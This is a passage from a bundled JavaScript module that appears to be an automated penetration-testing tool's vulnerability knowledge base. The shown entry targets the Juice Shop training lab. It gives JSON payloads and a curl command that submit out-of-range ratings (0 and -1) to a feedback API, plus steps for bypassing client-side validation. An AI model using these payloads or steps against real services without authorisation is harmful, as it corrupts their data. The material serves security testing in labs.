          "Rating/scoring input fields with defined ranges",
          "Client-side validation for numeric ranges",
          "API endpoints accepting numeric values with business constraints"
        ],
        testPayloads: [
          {
            method: "POST",
            endpoint: "/api/Feedbacks",
            headers: { "Content-Type": "application/json" },
            body: '{"UserId": 1, "comment": "Zero stars!", "rating": 0, "captchaId": 0, "captcha": ""}',
            description: "Submit feedback with rating=0 (below minimum of 1)",
            expectedIndicator: "Feedback accepted with rating 0"
          },
          {
            method: "POST",
            endpoint: "/api/Feedbacks",
            headers: { "Content-Type": "application/json" },
            body: '{"UserId": 1, "comment": "Negative!", "rating": -1, "captchaId": 0, "captcha": ""}',
            description: "Submit feedback with negative rating",
            expectedIndicator: "Feedback accepted with negative rating"
          }
        ],
        toolCommands: [
          {
            tool: "curl",
            args: `-s -X POST -H 'Content-Type: application/json' -d '{"UserId":1,"comment":"test","rating":0}' TARGET/api/Feedbacks`,
            description: "Test zero-star rating submission",
            parseHint: "Check if rating=0 is accepted (should be rejected if range is 1-5)"
          }
        ],
        exploitationSteps: [
          "1. Identify rating/scoring endpoints",
          "2. Note the valid range enforced by the UI (e.g., 1-5 stars)",
          "3. Intercept request and modify rating to 0, -1, or values outside range",
          "4. Submit via API directly, bypassing client-side validation",
          "5. Verify if server accepts out-of-range values"
        ],
        applicableLabs: ["juice-shop"],
        attackTechniques: ["T1565"],
        impact: "Business logic bypass, data integrity violation"
      }
    ];
  }
});

export {
  MISSED_VULN_PATTERNS,
  buildMissedVulnContext,
  buildMissedVulnAttackContext,
  getMissedVulnPayloads,
  getMissedVulnToolCommands,
  getMissedVulnsByCategory,
  getMissedVulnSummary,
  init_missed_vuln_training_knowledge
};
